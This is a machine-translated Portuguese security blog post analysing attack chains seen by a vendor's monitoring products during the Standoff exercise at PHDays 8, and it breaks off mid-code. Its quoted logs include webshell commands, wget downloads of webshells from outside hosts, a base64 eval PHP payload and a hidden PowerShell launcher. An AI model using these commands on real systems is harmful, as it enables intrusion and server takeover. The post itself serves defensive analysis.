<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚öóÔ∏è üë©üèª‚Äçüéì üë©üèæ‚ÄçüöÄ Confronto no Positive Hack Days 8: analisando cadeias de ataques ü§¨ üîÖ üêÉ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ent√£o, o pr√≥ximo ‚Äúconfronto‚Äù terminou nos Dias Positivos de Hack 8. Desta vez, mais de cem pessoas participaram da luta: 12 equipes de atacantes, 8 eq...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Confronto no Positive Hack Days 8: analisando cadeias de ataques</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Ent√£o, o pr√≥ximo ‚Äúconfronto‚Äù terminou nos Dias Positivos de Hack 8. Desta vez, mais de cem pessoas participaram da luta: 12 equipes de atacantes, 8 equipes de defensores e uma cidade inteira que eles tiveram que atacar e defender. <a name="habracut"></a><br><br>  Desta vez, o The Standoff contou com a presen√ßa n√£o apenas de equipes de atacantes e defensores, mas os tr√™s produtos de nossa empresa assistiram a tudo o que aconteceu na rede de jogos: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">MaxPatrol SIEM</a></b> - sistema SIEM. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O PT Network Attack Discovery</a></b> √© uma solu√ß√£o de seguran√ßa de rede para analisar o tr√°fego de rede, identificar e investigar incidentes. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O PT MultiScanner</a></b> √© um sistema multin√≠vel para detectar e bloquear conte√∫do malicioso. </li></ul><br>  Os tr√™s produtos foram monitorados pela equipe do centro de especialistas em seguran√ßa da Positive Technologies (PT ESC), que monitora tend√™ncias e eventos de jogos para informar os visitantes do centro de especialistas sobre isso. <br><br>  Essa foi a primeira participa√ß√£o de uma equipe de especialistas e produtos e eles mostraram seu melhor lado: havia tantos dados que seriam suficientes para um grande relat√≥rio.  As redes do escrit√≥rio n¬∫ 2 da empresa integradora SPUTNIK e do escrit√≥rio n¬∫ 1 da companhia de seguros BeHealthy acabaram sendo as mais interessantes e completas por descri√ß√£o.  O escrit√≥rio n¬∫ 2 foi interessante, pois estava sob a supervis√£o do SOC RTK, mas n√£o foi atendido por uma equipe de defensores e foi completamente invadido pelas equipes atacantes. <br><br>  Gostaria de lembrar que, al√©m de dois escrit√≥rios, a cidade possu√≠a usina termel√©trica e subesta√ß√£o, ferrovia, casas inteligentes com recupera√ß√£o de energia e bancos com caixas eletr√¥nicos. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Infraestrutura de jogos</i> <br><br>  Como ser√£o discutidos mais adiante os eventos nos escrit√≥rios # 1 e # 2 atrav√©s do prisma do MaxPatrol SIEM, PT NAD e PT MultiScanner, com √™nfase nos detalhes t√©cnicos do hacking. <br><br>  Diagrama l√≥gico de um escrit√≥rio de rede de jogos # 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  O endere√ßo das equipes atacantes √© 172.31.x.0 / 24, onde x √© o n√∫mero de comando de 1 a 8. De fato, havia 12 equipes no total, mas devido √† arquitetura da infraestrutura de rede da rede (o n√∫cleo da rede foi emulado no Cisco CSR1000v) e o f√≠sico equipamento, foi poss√≠vel organizar apenas 8 interfaces f√≠sicas de rede que foram trocadas por equipes em toda a √°rea de jogo.  Portanto, em quatro redes, duas equipes foram localizadas. <br><br>  Na infraestrutura do Office # 2, quatro segmentos de rede foram alocados: <br><br><ul><li>  DMZ (100.64.154.0/25); </li><li>  servidores (10.106.60.0/24); </li><li>  Funcion√°rios da empresa (10.106.50.0/24); </li><li>  equipe defensora (10.106.82.0/24). </li></ul><br>  Os n√≥s localizados na zona desmilitarizada estavam acess√≠veis pela rede para todos os atacantes.  Ao acessar esses n√≥s, os endere√ßos de rede reais dos comandos NAT eram do pool 100.110.255.0/24, portanto, para os defensores n√£o era f√°cil descobrir quem √© o dono desse ou daquele tr√°fego de rede - essa poderia ser uma das 12 equipes atacantes ou um verificador de script leg√≠timo, verificar a capacidade de manuten√ß√£o dos servi√ßos do mesmo pool de endere√ßos dos invasores. <br><br>  Para preencher nossos produtos com eventos sobre o que est√° acontecendo na infraestrutura de jogos, organizamos a remo√ß√£o e o redirecionamento de uma c√≥pia de todo o tr√°fego de rede no PT NAD, al√©m de configurar uma auditoria extensa dos eventos dos sistemas de destino e organizar sua entrega ao MaxPatrol SIEM. <br><br>  A an√°lise de ataques com √™nfase nas equipes pode ser encontrada em nosso outro <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">relat√≥rio sobre a Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  Um dos servidores no escrit√≥rio 2 da DMZ era um servidor com o Joomla CMS.  Poucas horas ap√≥s o in√≠cio do jogo, os primeiros sinais de comprometimento desse servidor apareceram no PT NAD - preenchimento de webshell a partir do pool de endere√ßos IP "cinza": <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Como mencionado, todas as sub-redes das equipes atacantes foram encerradas no mesmo ME (Attacker-FW) e, ao criar uma conex√£o com os objetos atacados, os endere√ßos IP dos atacantes foram convertidos em endere√ßos IP cinzentos a partir de um √∫nico pool (100.110.255.0/24).  Portanto, para a personifica√ß√£o de ataques por comandos, um esquema foi implementado com o enriquecimento de gateways de acordo com a tabela NAT deste ME.  No √¢mbito do MP SIEM, o enriquecimento foi o seguinte: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Essa abordagem nos permitiu determinar que esse ataque foi iniciado pela equipe n¬∫ 1.  No entanto, devido ao uso do mesmo conjunto de endere√ßos por equipes diferentes, n√£o podemos determinar com seguran√ßa o nome da equipe mediante solicita√ß√£o de uma rede espec√≠fica e, para fins de mais narra√ß√µes, nomearemos as equipes por seus n√∫meros de rede. <br><br>  Uma hora depois de tentar o comando n¬∫ 1, o PT NAD notou que o comando n¬∫ 8 estava sendo carregado em outro shell da web com o nome falante SHE __. Php, resultado de uma invas√£o de servidor ou uma simples verifica√ß√£o - n√£o foi poss√≠vel estabelecer com seguran√ßa, mas ap√≥s alguns minutos do mesmo dia 8 O comando define uma sess√£o ssh de um usu√°rio n√£o privilegiado. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  A senha desta conta estava no topo do dicion√°rio rockyou e foi correspondida.  O acesso √† conta raiz da 8a equipe apareceu apenas por volta das 16:00, devido √† participa√ß√£o do usu√°rio no grupo com o direito de executar comandos sem senha da raiz.  Podemos nos convencer disso nos logs do MP SIEM, que nos informam sobre o primeiro login como usu√°rio e, em seguida, a escala√ß√£o de privil√©gios com o comando sudo. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  O tempo do log pode variar em 3 horas devido √† configura√ß√£o do servidor do jogo. <br><br>  Na noite do primeiro dia do confronto, o sexto time tomou posse do Joomla.  A NAD descobriu a explora√ß√£o de uma vulnerabilidade, ou melhor, um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">recurso</a> por meio do qual a equipe carregou o amplamente conhecido shell da Web WSO e come√ßou a interagir com ele. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Vale ressaltar que o script usado pelos comandos para preencher as conchas, <br>  requer uma conta de administrador, cuja senha foi selecionada usando outra <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">vulnerabilidade</a> CVE-2017-14596 no mecanismo de autentica√ß√£o no Joomla via LDAP: alterando a solicita√ß√£o LDAP de autentica√ß√£o, os atacantes captam rapidamente o login e a senha da conta do administrador. <br><br>  E depois de meia hora, eles assumiram o controle de todo o sistema. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  As equipes atacantes usaram a m√°quina capturada para reconhecimento adicional na rede do segundo escrit√≥rio da SPUTNIK com os utilit√°rios nmap e hping3.  Podemos ter uma id√©ia de suas a√ß√µes a partir dos dados do MP SIEM: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Exemplo da rede 2 do escrit√≥rio de intelig√™ncia da DMZ (100.64.154.0/24) e da rede do time defensor (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  √Äs 21:17, descobrimos que o cliente OpenVPN foi instalado e iniciado no servidor Joomla.  A conex√£o foi estabelecida com o servidor 195.16.61.229, localizado em Moscou.  Um pouco mais tarde, descobrimos que essas a√ß√µes foram executadas por membros da equipe n¬∫ 6 e, portanto, a equipe conseguiu atrair recursos adicionais de computa√ß√£o e humanos localizados em um site remoto. <br><br>  Toda a intera√ß√£o com o site remoto foi realizada dentro do t√∫nel protegido, por isso √© imposs√≠vel estabelecer a natureza dessa intera√ß√£o e o grau de sua influ√™ncia no jogo.  S√≥ podemos tirar conclus√µes indiretas, com base no n√∫mero de sess√µes de VPN e na quantidade de dados transferidos. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Mas o mais interessante √© que a equipe n√£o limpou os rastreamentos - ap√≥s o jogo, encontramos no servidor ovpn uma configura√ß√£o contendo os certificados raiz e pessoais, a chave privada e os dados pessoais do propriet√°rio da chave.  Se voc√™ usa um mecanismo de pesquisa, n√£o √© dif√≠cil determinar a identidade real do propriet√°rio sob o apelido phonexicum.  O mapa completo com todas as conex√µes VPN durante o jogo pode ser examinado no final do artigo. <br><br>  Outros eventos interessantes come√ßaram a se desenvolver ap√≥s a meia-noite (+3 horas para os registros). <br>  O comando n¬∫ 4 do shell /id.php localiza o comando n¬∫ 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  E imediatamente se fortalece no sistema, preservando o shell WSO da Web sob o nome 123.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  A primeira equipe hospedada at√© a equipe 4 descobriu isso algumas horas depois e, ap√≥s uma breve discuss√£o, renomeia o shell id.php para 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Posteriormente, 021371b392f0b42398630fd668adff5d.php foi substitu√≠do por kekekeke.php e kekpek.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Os seguintes eventos na infraestrutura de dom√≠nio do escrit√≥rio # 2 SPUTNIK est√£o intimamente relacionados ao que est√° acontecendo em Jumla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Depois que o Joomla foi perfurado, o atacante ganhou acesso aos segmentos internos da infraestrutura do SPUTNIK (Office # 2).  Sem pensar duas vezes, a explora√ß√£o do MS17-010 voa para o controlador de dom√≠nio WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  √â mais conveniente observar a cronologia de outros eventos pelos gatilhos do MP SIEM: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  O primeiro passo do invasor foi criar um usu√°rio com o nome "nome de usu√°rio" e a senha "1qazzaq!"  e adicion√°-lo ao grupo de administradores locais (tela 2).  A explora√ß√£o bem-sucedida de explora√ß√µes do MS17-010 fornece acesso com privil√©gios NT-Authority \ System e, nos logs do Windows, esse acesso √© exibido como win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  Em nome do novo usu√°rio, cria alguns servi√ßos que executam um certo script do PowerShell: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span 